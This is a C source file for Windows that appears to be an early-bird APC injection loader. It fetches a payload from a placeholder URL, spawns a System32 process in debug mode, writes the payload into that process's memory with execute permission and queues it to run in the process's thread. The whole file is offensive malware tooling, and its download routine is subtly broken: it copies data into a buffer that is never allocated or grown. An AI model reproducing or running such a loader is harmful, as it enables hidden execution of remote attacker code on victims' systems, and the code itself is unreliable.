#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

#pragma warning (disable:4996)
#pragma comment (lib, "Wininet.lib")
#define PAYLOAD	L"<URL_to_payload>"
#define TARGET "<target_process>"




BOOL GetPayload(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;

    DWORD		dwBytesRead = NULL;

    SIZE_T		sSize = NULL;

    PBYTE		pBytes = NULL,
        pTmpBytes = NULL;


    hInternet = InternetOpenW(L"gonzo_was_here", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[ERR] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _ElFin;
    }


    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf("[ERR] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _ElFin;
    }


    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _ElFin;
    }

    while (TRUE) {


        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[ERR] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _ElFin;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }


    }



    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_ElFin:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}



BOOL HousePayload(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[ERR] GetEnvironmentVariable failed with error: %d\n", GetLastError());
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
        printf("[ERR] CreateProcessA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;


    return FALSE;
}



BOOL MoveInPayload(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[ERR] VirtualAllocEx failed with error: %d\n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory failed with error: %d\n", GetLastError());
        return FALSE;
    }

    memset(pShellcode, '\0', sSizeOfShellcode);

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx failed with error: %d\n", GetLastError());
        return FALSE;
    }


    return TRUE;
}



int main() {

    HANDLE hProcess = NULL,
        hThread = NULL;

    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    SIZE_T	sSize = NULL;
    PBYTE	pBytes = NULL;

    if (!GetPayload(PAYLOAD, &pBytes, &sSize)) {
        return -1;
    }

    
    if (!HousePayload(TARGET, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }

    if (!MoveInPayload(hProcess, pBytes, sSize, &pAddress)) {
        return -1;
    }

    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

    DebugActiveProcessStop(dwProcessId);
    printf("[$$] FIN\n");


    CloseHandle(hProcess);
    CloseHandle(hThread);
    HeapFree(GetProcessHeap(), 0, pBytes);

    return 0;
}
